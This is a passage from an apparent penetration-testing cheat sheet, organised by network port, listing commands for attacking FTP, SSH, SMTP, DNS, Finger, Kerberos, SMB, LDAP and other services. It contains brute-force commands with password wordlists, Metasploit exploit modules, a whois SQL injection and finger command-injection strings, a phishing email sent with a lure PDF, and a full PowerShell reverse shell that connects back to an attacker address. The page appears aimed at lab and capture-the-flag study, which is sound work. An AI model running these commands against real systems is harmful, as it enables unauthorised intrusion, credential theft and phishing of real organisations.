+<a href=https://en.wikipedia.org/wiki/ECHO_protocol>https://en.wikipedia.org/wiki/ECHO_protocol</a></p><h2 id=port-21---ftp>Port 21 - FTP
+<a class=heading-link href=#port-21---ftp><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p <span style=color:#ff0;font-weight:700>21</span> $IP
+
+<span style=color:#007f7f># Banner Grabbing</span>
+telnet -vn $IP <span style=color:#ff0;font-weight:700>21</span>
+
+<span style=color:#007f7f># Anonymous login</span>
+ftp &lt;IP&gt;
+&gt;anonymous
+&gt;anonymous
+&gt;ls -a <span style=color:#007f7f># List all files</span>
+&gt;binary <span style=color:#007f7f>#Set transmission to binary instead of ascii</span>
+&gt;ascii <span style=color:#007f7f>#Set transmission to ascii instead of binary</span>
+&gt;bye <span style=color:#007f7f>#exit</span>
+
+<span style=color:#007f7f># Browser connection</span>
+ftp://anonymous:anonymous@10.10.10.xx
+
+<span style=color:#007f7f># Download all files</span>
+wget -m ftp://anonymous:anonymous@$IP <span style=color:#007f7f>#Donwload all</span>
+wget -m --no-passive ftp://anonymous:anonymous@$IP <span style=color:#007f7f>#Download all</span>
+
+</code></pre></div><h2 id=port-22---ssh>Port 22 - SSH
+<a class=heading-link href=#port-22---ssh><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nc -vn $IP <span style=color:#ff0;font-weight:700>22</span>
+
+<span style=color:#007f7f># Public SSH key of server</span>
+ssh-keyscan -t rsa $IP -p &lt;PORT&gt;
+
+<span style=color:#007f7f># BruteForce:</span>
+
+patator ssh_login host=$IP port=<span style=color:#ff0;font-weight:700>22</span> user=root 0=your_file.txt password=FILE0 -x ignore:mesg=<span style=color:#0ff;font-weight:700>&#39;Authentication failed.&#39;</span>
+
+hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
+
+medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
+
+ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
+
+<span style=color:#007f7f>#Msf</span>
+use auxiliary/fuzzers/ssh/ssh_version_2
+
+<span style=color:#007f7f>#SSH Enum users &lt; 7.7:</span>
+
+python ssh_user_enum.py --port <span style=color:#ff0;font-weight:700>2223</span> --userList /root/Downloads/users.txt $IP 2&gt;/dev/null | grep <span style=color:#0ff;font-weight:700>&#34;is a&#34;</span>
+
+<span style=color:#007f7f># Tunneling</span>
+sudo ssh -L &lt;local_port&gt;:&lt;remote_host&gt;:&lt;remote_port&gt; -N -f &lt;username&gt;@&lt;ip_compromised&gt;
+
+</code></pre></div><p><a href=https://github.com/six2dez/ssh_enum_script>https://github.com/six2dez/ssh_enum_script</a></p><p><a href=https://www.exploit-db.com/exploits/45233>https://www.exploit-db.com/exploits/45233</a></p><h3 id=port-23---telnet>Port 23 - Telnet
+<a class=heading-link href=#port-23---telnet><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Banner Grabbing</span>
+nc -vn $IP <span style=color:#ff0;font-weight:700>23</span>
+
+<span style=color:#007f7f># nmap</span>
+nmap -n -sV -Pn --script <span style=color:#0ff;font-weight:700>&#34;*telnet* and safe&#34;</span> -p <span style=color:#ff0;font-weight:700>23</span> $IP
+
+</code></pre></div><h3 id=port-25---telnet>Port 25 - Telnet
+<a class=heading-link href=#port-25---telnet><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># Finding MX servers of an organisation</span>
+dig +short mx google.com
+
+<span style=color:#007f7f># smtps</span>
+openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
+
+<span style=color:#007f7f># Enumeration</span>
+nmap -p25 --script smtp-commands $IP
+<span style=color:#007f7f># or use  nmap plugin smtp-ntlm-info.nse</span>
+<span style=color:#007f7f># enum users</span>
+msf &gt; auxiliary/scanner/smtp/smtp_enum
+smtp-user-enum
+nmap –script smtp-enum-users.nse $IP
+
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Send Email from linux console</span>
+[root:~] sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
+Reading message body from STDIN because the <span style=color:#0ff;font-weight:700>&#39;-m&#39;</span> option was not used.
+If you are manually typing in a message:
+  - First line must be received within <span style=color:#ff0;font-weight:700>60</span> seconds.
+  - End manual input with a CTRL-D on its own line.
+
+IT Dept,
+
+We are sending this important file to all our customers. It contains very important instructions <span style=color:#fff;font-weight:700>for</span> upgrading and securing your software. Please <span style=color:#fff;font-weight:700>read</span> and <span style=color:#fff;font-weight:700>let</span> us know <span style=color:#fff;font-weight:700>if</span> you have any problems.
+
+Sincerely,
+
+</code></pre></div><h3 id=port-43---whois>Port 43 - WHOIS
+<a class=heading-link href=#port-43---whois><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumerate</span>
+whois -h $IP -p &lt;PORT&gt; <span style=color:#0ff;font-weight:700>&#34;domain.tld&#34;</span>
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;domain.ltd&#34;</span> | nc -vn $IP &lt;PORT&gt;
+
+Also, the WHOIS service always needs to use a database to store and extract the information.
+So, a possible SQLInjection could be present when querying the database from some information provided by the user.
+For example doing: whois -h 10.10.10.155 -p <span style=color:#ff0;font-weight:700>43</span> <span style=color:#0ff;font-weight:700>&#34;a&#39;) or 1=1#&#34;</span>
+you could be able to extract all the information saved in the database.
+</code></pre></div><h3 id=port-53---dns>Port 53 - DNS
+<a class=heading-link href=#port-53---dns><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># nslookup</span>
+nslookup
+&gt; SERVER &lt;IP_DNS&gt; <span style=color:#007f7f>#Select dns server</span>
+&gt; 127.0.0.1 <span style=color:#007f7f>#Reverse lookup of 127.0.0.1, maybe...</span>
+&gt; &lt;IP_MACHINE&gt; <span style=color:#007f7f>#Reverse lookup of a machine, maybe...</span>
+
+<span style=color:#007f7f># DNS lookups, Zone Transfers &amp; Brute-Force</span>
+whois domain.com
+dig {a|txt|ns|mx} domain.com
+dig {a|txt|ns|mx} domain.com @ns1.domain.com
+host -t {a|txt|ns|mx} megacorpone.com
+host -a megacorpone.com
+host -l megacorpone.com ns1.megacorpone.com
+dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
+dnsenum domain.com
+<span style=color:#007f7f># DNS - Subdomains BF</span>
+dnsrecon -D subdomains-1000.txt -d &lt;DOMAIN&gt; -n &lt;IP_DNS&gt;
+dnscan -d &lt;domain&gt; -r -w subdomains-1000.txt <span style=color:#007f7f>#Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan</span>
+
+<span style=color:#fff;font-weight:700>for</span> sub in <span style=color:#fff;font-weight:700>$(</span>cat subdomains.txt<span style=color:#fff;font-weight:700>)</span>;<span style=color:#fff;font-weight:700>do</span> host $sub.domain.com|grep <span style=color:#0ff;font-weight:700>&#34;has.address&#34;</span>;<span style=color:#fff;font-weight:700>done</span>
+
+</code></pre></div><h3 id=port-69---udp---tftp>Port 69 - UDP - TFTP
+<a class=heading-link href=#port-69---udp---tftp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap -p69 --script=tftp-enum.nse $IP <span style=color:#007f7f># Or</span>
+nmap -n -Pn -sU -p69 -sV --script tftp-enum $IPP
+<span style=color:#007f7f># Download Upload</span>
+msf5&gt; auxiliary/admin/tftp/tftp_transfer_util
+
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#fff;font-weight:700>import</span> tftpy
+client = tftpy.TftpClient(&lt;ip&gt;, &lt;port&gt;)
+client.download(<span style=color:#0ff;font-weight:700>&#34;filename in server&#34;</span>, <span style=color:#0ff;font-weight:700>&#34;/tmp/filename&#34;</span>, timeout=<span style=color:#ff0;font-weight:700>5</span>)
+client.upload(<span style=color:#0ff;font-weight:700>&#34;filename to upload&#34;</span>, <span style=color:#0ff;font-weight:700>&#34;/local/path/file&#34;</span>, timeout=<span style=color:#ff0;font-weight:700>5</span>)
+
+</code></pre></div><h3 id=port-79---finger>Port 79 - Finger
+<a class=heading-link href=#port-79---finger><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration Banner Grabbing/Basic connection</span>
+nc -vn &lt;IP&gt; <span style=color:#ff0;font-weight:700>79</span>
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;root&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>79</span>
+
+<span style=color:#007f7f># User enumeration</span>
+finger @$IP       <span style=color:#007f7f>#List users</span>
+finger admin@$IP  <span style=color:#007f7f>#Get info of user</span>
+finger user@$IP   <span style=color:#007f7f>#Get info of user</span>
+
+<span style=color:#007f7f># msf</span>
+use auxiliary/scanner/finger/finger_users
+
+<span style=color:#007f7f># command exec</span>
+finger <span style=color:#0ff;font-weight:700>&#34;|/bin/id@example.com&#34;</span>
+finger <span style=color:#0ff;font-weight:700>&#34;|/bin/ls -a /@example.com&#34;</span>
+
+</code></pre></div><h3 id=kerberos---88>Kerberos - 88
+<a class=heading-link href=#kerberos---88><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>GET USERS:
+
+nmap -p <span style=color:#ff0;font-weight:700>88</span> --script=krb5-enum-users --script-args=<span style=color:#0ff;font-weight:700>&#34;krb5-enum-users.realm=&#39;DOMAIN.LOCAL&#39;&#34;</span> $IP
+msf&gt; use auxiliary/gather/kerberos_enumusers
+
+python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads <span style=color:#ff0;font-weight:700>20</span> -domain DOMAIN -outputfile kb_extracted_passwords.txt
+
+</code></pre></div><blockquote><p><a href=https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/>https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/</a>
+<a href="https://www.youtube.com/watch?v=snGeZlDQL2Q">https://www.youtube.com/watch?v=snGeZlDQL2Q</a>
+<a href=https://www.tarlogic.com/blog/como-funciona-kerberos/>https://www.tarlogic.com/blog/como-funciona-kerberos/</a>
+<a href=https://www.tarlogic.com/blog/como-atacar-kerberos/>https://www.tarlogic.com/blog/como-atacar-kerberos/</a></p></blockquote><h3 id=port-110---pop3>Port 110 - POP3
+<a class=heading-link href=#port-110---pop3><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>telnet $IP
+USER taha@$IP
+PASS admin
+
+or:
+
+USER admin
+PASS admin
+
+</code></pre></div><h3 id=port-995--110---pop>Port 995 / 110 - POP
+<a class=heading-link href=#port-995--110---pop><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Banner Grabbing</span>
+nc -nv $IP <span style=color:#ff0;font-weight:700>110</span>
+openssl s_client -connect $IP:995 -crlf -quiet
+
+<span style=color:#007f7f># Automated</span>
+nmap --scripts <span style=color:#0ff;font-weight:700>&#34;pop3-capabilities or pop3-ntlm-info&#34;</span> -sV -port &lt;PORT&gt; $IP
+
+<span style=color:#007f7f># POP syntax</span>
+POP commands:
+  USER uid           Log in as <span style=color:#0ff;font-weight:700>&#34;uid&#34;</span>
+  PASS password      Substitue <span style=color:#0ff;font-weight:700>&#34;password&#34;</span> <span style=color:#fff;font-weight:700>for</span> your actual password
+  STAT               List number of messages, total mailbox size
+  LIST               List messages and sizes
+  RETR n             Show message n
+  DELE n             Mark message n <span style=color:#fff;font-weight:700>for</span> deletion
+  RSET               Undo any changes
+  QUIT               Logout (expunges messages <span style=color:#fff;font-weight:700>if</span> no RSET)
+  TOP msg n          Show first n lines of message number msg
+  CAPA               Get capabilities
+
+</code></pre></div><ul><li><a href=http://sunnyoasis.com/services/emailviatelnet.html>http://sunnyoasis.com/services/emailviatelnet.html</a></li></ul><h3 id=port-111---rpcbind>Port 111 - Rpcbind
+<a class=heading-link href=#port-111---rpcbind><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+rpcinfo irked.htb <span style=color:#007f7f># htb hhhh</span>
+nmap -sSUC -p111 $IP
+
+rpcinfo -p $IP
+rpcclient -U <span style=color:#0ff;font-weight:700>&#34;&#34;</span> $IP
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+</code></pre></div><h3 id=port-113---ident>Port 113 - Ident
+<a class=heading-link href=#port-113---ident><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Nmap</span>
+-- By default (-sC) nmap will identify every user of every running port
+
+</code></pre></div><h3 id=port-123---tnp>Port 123 - TNP
+<a class=heading-link href=#port-123---tnp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sU -sV --script <span style=color:#0ff;font-weight:700>&#34;ntp* and (discovery or vuln) and not (dos or brute)&#34;</span> -p <span style=color:#ff0;font-weight:700>123</span> $IP
+
+ntpq -c readlist $IP
+ntpq -c readvar $IP
+ntpq -c monlist $IP
+ntpq -c peers $IP
+ntpq -c listpeers $IP
+ntpq -c associations $IP
+ntpq -c sysinfo $IP
+
+</code></pre></div><h3 id=port-135---msrpc>Port 135 - MSRPC
+<a class=heading-link href=#port-135---msrpc><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap $IP --script=msrpc-enum
+nmap -n -sV -p <span style=color:#ff0;font-weight:700>135</span> --script=msrpc-enum $IP
+
+<span style=color:#007f7f># Msf</span>
+msf &gt; use exploit/windows/dcerpc/ms03_026_dcom
+msf &gt; use auxiliary/scanner/dcerpc/endpoint_mapper
+msf &gt; use auxiliary/scanner/dcerpc/hidden
+msf &gt; use auxiliary/scanner/dcerpc/management
+msf &gt; use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+
+<span style=color:#007f7f># Identifying Exposed RPC Services</span>
+rpcdump [-p port] $IP
+IfId: 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc version 1.0
+Annotation: Messenger Service
+UUID: 00000000-0000-0000-0000-000000000000
+Binding: ncadg_ip_udp:192.168.189.1[1028]
+
+rpcdump.py $IP -p <span style=color:#ff0;font-weight:700>135</span>
+
+</code></pre></div><h3 id=port-139445---smb>Port 139/445 - SMB
+<a class=heading-link href=#port-139445---smb><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enum hostname</span>
+enum4linux -n $IP
+nmblookup -A $IP
+nmap --script=smb-enum* --script-args=unsafe=<span style=color:#ff0;font-weight:700>1</span> -T5 $IP
+
+<span style=color:#007f7f># Get Version</span>
+smbver.sh $IP
+Msfconsole;use scanner/smb/smb_version
+ngrep -i -d tap0 <span style=color:#0ff;font-weight:700>&#39;s.?a.?m.?b.?a.*[[:digit:]]&#39;</span>
+smbclient -L <span style=color:#0ff;font-weight:700>\\\\</span>$IP
+
+<span style=color:#007f7f># Get Shares</span>
+smbmap -H  $IP -R &lt;sharename&gt;
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#fff;font-weight:700>exit</span> | smbclient -L <span style=color:#0ff;font-weight:700>\\\\</span>
+smbclient <span style=color:#0ff;font-weight:700>\\\\</span>$IP<span style=color:#0ff;font-weight:700>\\</span>&lt;share&gt;
+smbclient -L //$IP -N
+nmap --script smb-enum-shares -p139,445 -T4 -Pn $IP
+smbclient -L <span style=color:#0ff;font-weight:700>\\\\</span>$IP<span style=color:#0ff;font-weight:700>\\</span>
+
+<span style=color:#007f7f># Check null sessions</span>
+smbmap -H $IP
+rpcclient -U <span style=color:#0ff;font-weight:700>&#34;&#34;</span> -N $IP
+smbclient //$IP/IPC$ -N
+
+<span style=color:#007f7f># Exploit null sessions</span>
+enum -s $IP
+enum -U $IP
+enum -P $IP
+enum4linux -a $IP
+/usr/share/doc/python3-impacket/examples/samrdump.py $IP
+
+<span style=color:#007f7f># Connect to username shares</span>
+smbclient //$IP/share -U username
+
+<span style=color:#007f7f># Connect to share anonymously</span>
+smbclient <span style=color:#0ff;font-weight:700>\\\\</span>$IP<span style=color:#0ff;font-weight:700>\\</span>&lt;share&gt;
+smbclient //$IP/&lt;share&gt;
+smbclient //$IP/&lt;share<span style=color:#0ff;font-weight:700>\ </span>name&gt;
+smbclient //$IP/&lt;<span style=color:#0ff;font-weight:700>&#34;&#34;</span>share name<span style=color:#0ff;font-weight:700>&#34;&#34;</span>&gt;
+rpcclient -U <span style=color:#0ff;font-weight:700>&#34; &#34;</span> $IP
+rpcclient -U <span style=color:#0ff;font-weight:700>&#34; &#34;</span> -N $IP
+
+<span style=color:#007f7f># Check vulns</span>
+nmap --script smb-vuln* -p139,445 -T4 -Pn $IP
+
+<span style=color:#007f7f># Check common security concerns</span>
+msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc
+
+<span style=color:#007f7f># Extra validation</span>
+msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc
+
+<span style=color:#007f7f># Multi exploits</span>
+msfconsole; use exploit/multi/samba/usermap_script; <span style=color:#fff;font-weight:700>set</span> lhost 192.168.0.X; <span style=color:#fff;font-weight:700>set</span> rhost $IP; run
+
+<span style=color:#007f7f># Bruteforce login</span>
+medusa -h $IP -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
+nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $IP  -vvvv
+nmap –script smb-brute $IP
+
+<span style=color:#007f7f># nmap smb enum &amp; vuln</span>
+
+nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $IP
+
+nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 $IP
+
+<span style=color:#007f7f># Mount smb volume linux</span>
+mount -t cifs -o username=user,password=password //$IP/share /mnt/share
+
+<span style=color:#007f7f># rpcclient commands</span>
+rpcclient -U <span style=color:#0ff;font-weight:700>&#34;&#34;</span> $IP
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+
+<span style=color:#007f7f># Run cmd over smb from linux</span>
+winexe -U username //$IP <span style=color:#0ff;font-weight:700>&#34;cmd.exe&#34;</span> --system
+
+<span style=color:#007f7f># smbmap</span>
+    <span style=color:#007f7f>#Enum</span>
+smbmap.py -H $IP -u administrator -p asdf1234
+    <span style=color:#007f7f>#RCE</span>
+smbmap.py -u username -p <span style=color:#0ff;font-weight:700>&#39;P@$$w0rd1234!&#39;</span> -d DOMAINNAME -x <span style=color:#0ff;font-weight:700>&#39;net group &#34;Domain Admins&#34; /domain&#39;</span> -H $IP
+    <span style=color:#007f7f># Drive Listing</span>
+smbmap.py -H $IP -u username -p <span style=color:#0ff;font-weight:700>&#39;P@$$w0rd1234!&#39;</span> -L
+    <span style=color:#007f7f># Reverse Shell</span>
+smbmap.py -u username -p <span style=color:#0ff;font-weight:700>&#39;P@$$w0rd1234!&#39;</span> -d ABC -H $IP -x <span style=color:#0ff;font-weight:700>&#39;powershell -command &#34;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=&#34;&#34;&#34;&#34;192.168.0.X&#34;&#34;&#34;&#34;; $port=&#34;&#34;&#34;&#34;4445&#34;&#34;&#34;&#34;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=&#34;&#34;&#34;&#34;cmd.exe&#34;&#34;&#34;&#34;  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=&#34;&#34;&#34;&#34; &#34;&#34;&#34;&#34;}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};&#34;&#39;</span>
+
+<span style=color:#007f7f># Check</span>
+<span style=color:#0ff;font-weight:700>\P</span>olicies<span style=color:#0ff;font-weight:700>\{</span>REG}<span style=color:#0ff;font-weight:700>\M</span>ACHINE<span style=color:#0ff;font-weight:700>\P</span>references<span style=color:#0ff;font-weight:700>\G</span>roups<span style=color:#0ff;font-weight:700>\G</span>roups.xml look <span style=color:#fff;font-weight:700>for</span> user&amp;pass <span style=color:#0ff;font-weight:700>&#34;gpp-decrypt &#34;</span>
+
+</code></pre></div><h3 id=port-143--993--imap>Port 143 / 993- IMAP
+<a class=heading-link href=#port-143--993--imap><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Banner grabbing</span>
+nc -nv $IP <span style=color:#ff0;font-weight:700>143</span>
+openssl s_client -connect $IP:993 -quiet
+
+<span style=color:#007f7f># NTLM Auth - Information disclosure</span>
+-- use the nmap script imap-ntlm-info.nse
+
+</code></pre></div><h3 id=port-161162-udp---snmp>Port 161/162 UDP - SNMP
+<a class=heading-link href=#port-161162-udp---snmp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
+
+snmp-check $IP -c public|private|community
+
+snmpwalk -v 2c -c public $ip
+
+</code></pre></div><h3 id=port---19466676660-7000---irc>Port - 194,6667,6660-7000 - IRC
+<a class=heading-link href=#port---19466676660-7000---irc><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
+
+</code></pre></div><h3 id=port-264---check-point-firewall-1>Port 264 - Check Point FireWall-1
+<a class=heading-link href=#port-264---check-point-firewall-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf &gt; use auxiliary/gather/checkpoint_hostname
+msf &gt; <span style=color:#fff;font-weight:700>set</span> RHOST $IP
+
+<span style=color:#007f7f># read</span>
+* https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#check-point-firewall-1-topology-port-264
+
+</code></pre></div><h3 id=ldap---389-636-3268-3269>LDAP - 389, 636, 3268, 3269
+<a class=heading-link href=#ldap---389-636-3268-3269><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Basic Enumeration</span>
+nmap -n -sV --script <span style=color:#0ff;font-weight:700>&#34;ldap* and not brute&#34;</span> $IP
+
+<span style=color:#007f7f># Clear text credentials</span>
+* If LDAP is used without SSL you can sniff credentials in plain text in the network.
+
+ldapsearch -h $IP -p <span style=color:#ff0;font-weight:700>389</span> -x -b <span style=color:#0ff;font-weight:700>&#34;dc=mywebsite,dc=com&#34;</span>
+
+ldapsearch -x -h $IP -D <span style=color:#0ff;font-weight:700>&#39;DOMAIN\user&#39;</span> -w <span style=color:#0ff;font-weight:700>&#39;hash-password&#39;</span>
+
+ldapdomaindump $IP -u <span style=color:#0ff;font-weight:700>&#39;DOMAIN\user&#39;</span> -p <span style=color:#0ff;font-weight:700>&#39;hash-password&#39;</span>
+
+ldapsearch -x -h $IP -D <span style=color:#0ff;font-weight:700>&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> -w <span style=color:#0ff;font-weight:700>&#39;&lt;password&gt;&#39;</span> -b <span style=color:#0ff;font-weight:700>&#34;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&#34;</span>
+
+<span style=color:#007f7f>#brut</span>
+
+ldapsearch -x -h $IP -D <span style=color:#0ff;font-weight:700>&#39;&#39;</span> -w <span style=color:#0ff;font-weight:700>&#39;&#39;</span> -b <span style=color:#0ff;font-weight:700>&#34;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&#34;</span>
+ldapsearch -x -h $IP -D <span style=color:#0ff;font-weight:700>&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> -w <span style=color:#0ff;font-weight:700>&#39;&lt;password&gt;&#39;</span> -b <span style=color:#0ff;font-weight:700>&#34;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&#34;</span>
+
+patator ldap_login host=$IP 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg=<span style=color:#0ff;font-weight:700>&#39;Authentication failed.&#39;</span>
+
+<span style=color:#007f7f># for GUI</span>
+Graphical Interface
+You can download a graphical interface with LDAP server here:
+http://www.jxplorer.org/downloads/users.html
+
+</code></pre></div><h3 id=https---443>HTTPS - 443
+<a class=heading-link href=#https---443><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li>Read the actual SSL CERT to:<ul><li>find out potential correct vhost to GET</li><li>is the clock skewed</li><li>any names that could be usernames for bruteforce/guessing.</li></ul></li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sslscan $IP:443
